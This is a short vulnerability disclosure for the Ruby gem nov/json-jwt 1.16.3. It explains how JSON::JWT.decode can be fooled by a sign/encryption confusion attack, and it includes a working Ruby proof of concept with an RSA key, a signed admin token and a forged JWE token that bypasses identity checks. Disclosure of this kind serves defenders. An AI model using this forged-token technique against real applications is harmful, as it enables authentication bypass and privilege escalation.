# nov/json-jwt has a permissions bypass problem

## 0x01 Affected version

vendor: https://github.com/nov/json-jwt

version: 1.16.3

Ruby version: 2.6.10p210

## 0x02 Vulnerability description

A privilege bypass vulnerability exists in `JSON::JWT.decode` in `nov/json-jwt 1.16.3`, which could allow a user to bypass its identity checks under certain circumstances.

When the `JSON::JWT.decode` function parses a Token, it automatically determines whether the Token belongs to JWS or JWE.

![image-20231222204636490](novjson-jwt/image-20231222204636490.png)

If the developer uses the `RS-*` of signing algorithms and an attacker has access to the public key, a `sign/encryption confusion attack` could result, leading to a privilege bypass.

The following code is an example of using JWE to bypass `JSON::JWT.decode` here.

```ruby
require 'json/jwt'

key = JSON::JWK.new(
  "kty": "RSA",
  "n": "lZcUv-lOnuv1EigX9C6OAZ1ZTsSj8jyibCCIZTzsPqRUVcBhGXEwzUz6ZopNFkEV2KEPPJczdxAzl6c6SHAxY2yvW4Ea9FTGdfY6yNTRxzalEGsBFFgn_gO2uVRbWj1I1miKGNgsJCvXhWPQVqp5OEOyqfQmKQ6-ty8jRCBdABC8XSZcoZ3vEIRril4SHayhYCHFqLm4W567OKUDtgLDrO0HVbaU4Pg_MnMmcW7FoNqHwfMJE8fd4a49MU1CUR2SGxZbRA2E30eyM0pbV8ojrLPNjDM6qlsGg2lLVIgemzOMXzMh-6oDSjAvUtJmKjyfMFEEzMvGAVDqM8wH8IWubQ==",
  "e": "AQAB",
  "d": "fIHnj2SNP9F9hcNBTMiDAe0JrHoXS0QUnJLnc_wlVm5Ik6cwKpD_4aE0uaxbRS6fFFPZ7sCa4Xrmtk9GP4zCTtLjkfH_kWYOWZi8jPQ2Nu3Qrb2ihGBryQ0mRVNlRdLEkVEpwEwNUX38QNY3TitOAfq29qZ0LLBNJQNjAw082xPNI2um9wmgUzNcSwnJLL0ZiavQOisTQxSye8Yn2e7TIUShdDLRa9aPne-N_q5dlfAAv3_n1BHg7zcmYTUgagfEz_atesbXlgoZMjHG017HeQGHj5p527ZGz8SK-NHDQhCu9Qi0Z3lzRJkPsL66EIxAsiqyp-vgNzThqI7rTiWysQ==",
  "p": "x00TJFvOrGf42G75_xxWTa3WRvOYeQ3SazCDhl20-Gokc7BxAghAU5LeXoIu2aX3xIc8F8_LNiKEFT2aOo2O6svUU3Kh-zUHqsQ7UBpoXd4W_uZb3Gd8w8C5Oypz-zrxEyhoOwQkugfpxPNxlK3jRQ4cSr489yOnftRGz7Y2CPc=",
  "q": "wCWadtQjvUuCqPwDK3kAPpocERrJN22ZTO6dtW_Gkixjmw6L4zyM6k6U-BNPVS3wfc-m-GFlNo_9NRJ9DUl113_v81ln_1hujP-ci8Apf4_B9ItJl3z35GG7JRIL5Y8if8uMEGWX-H17Wj0Rz4Sd5zwdY4W2qU512PDyqeilbrs=",
  "dp": "KIZllAkO90OU9_1o3BTY_6aPYZH6uPK0jJMqy1GWkMSUcOm5sN4YpmXAzZrPB_aVcOLGt1jLS1CtZtxF1g4et2OG4wj2IuxfiLuqC9myyxNzvZT9rM1mMy-m-n7hYn5Tsr-OoiFvjlw5jpCp0b-h7NK3sgMIxn_7ePCVDXtRdXU=",
  "dq": "gvDdO39Dv7sWlnvu2RBDZ2X0HH_pgblRkAjINp2ub2yKkF8wWzGnQgE9KXVXSc_dpI7-1SLiK3WicylfSM-325yW83oJEgy8gZ-rmdzhKsnXvgOxqeeCswMa2p9athx9wSMAFyh0kOVKS2t0mLtiM_NWf7zehrAuRSGl7L3bBwM=",
  "qi": "fkU01pCfV_LO8uXrXZxcnzzrI7eaRiVmJT7vyGDvEjwCLBu0JMOx41TZCU_2ZS9crFVbif5Clg60O2clwctG6ElizwRFPoDZ4gVnAGgGchCxGxvwEpkkoYFbsjJz06KdHAozs0MKoUUSFqxGB4fXmsKmARA-pbKWVoDs7T3_0hI="
)

jws = "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6IkY0RGEwY3Z1NVpWV0IxLURWWGk5NnExLTV4b3BxLXhkNXYtY1VaSXoySlUifQ.eyJ1c2VyIjoiYWRtaW4ifQ.gia0rb7-eOIrQtAYtSrlwp45DUqLjG6DJO5UIzUw0iH_vbjsjXdND6sV2Rk3JxH2ezKTiPf-ovXbnRajL1enXf9gh6mxaDNoMV5E_LsYfTyM6NgpcSfbstkzla_bxR7cZUGPDzzCXO28ekeF-oiPF4_v-c1co5JXgxLJdVaIpL8RPeg_jcBaHDjqTqCkV3ZIC8_faPE1XLY1N3WHNU2ap-1Y7SUrrd3BQGM03JkRLFstQFVuFFV2AJKZbRtdbURodoAjtJRossVfTfZZ-EKXnX-GxUVdpmp64uJFiAET_BrEtJGqBJbICEshBLp8_2oUxE7HErGZTVip5IOePdAS2g"

JSON::JWT.decode jws, key

jwe = "eyJraWQiOiJGNERhMGN2dTVaVldCMS1EVlhpOTZxMS01eG9wcS14ZDV2LWNVWkl6MkpVIiwiYWxnIjoiUlNBMV81IiwiZW5jIjoiQTEyOENCQy1IUzI1NiJ9.eEGPvIQnU7piVQyo9Y2-GpKwMtSH66FfcLJ9oG63YU8iv5X3BfIv-W3f6whD7J3hwkwXjzaqDTUaLBkR8_omUZTWUHV8O6vQEqTAWt_a_B7UH6QqUkMm7iK78ZqYOpbJFb2lpNlV-YjOqh2kS_i-TUvxasLOsGCy03rBmkWFi7FbrBKqfwz62QYMJoSnaaV3CTNfU9kOUUJGyDLp3H-i3ggdKz88kdChzbAdrno1ZBq41dj0pK8uWqx1k67mm1JKvYlXREDWwnih9jpqwkLNMZFMNHGuqCw0kMCjpLJV7FH_nEL4-xnobWAHCJ3ue4F83HCe1SRH0550VXaOuArNig.jlrf727C65iURG3SOj4p_g.FhzEBHEYsM_dF76VP5i4NSw_8BXROrk35_regv5OFWJ4x1FI-aYYIgmtdeudUP6PBL8dKaZXzqszkldk1D7Ghg.Ljg3h8chNeRXTzqR_HYv_w"

JSON::JWT.decode jwe, key
```

## 0x03 Acknowledgement

P3ngu1nW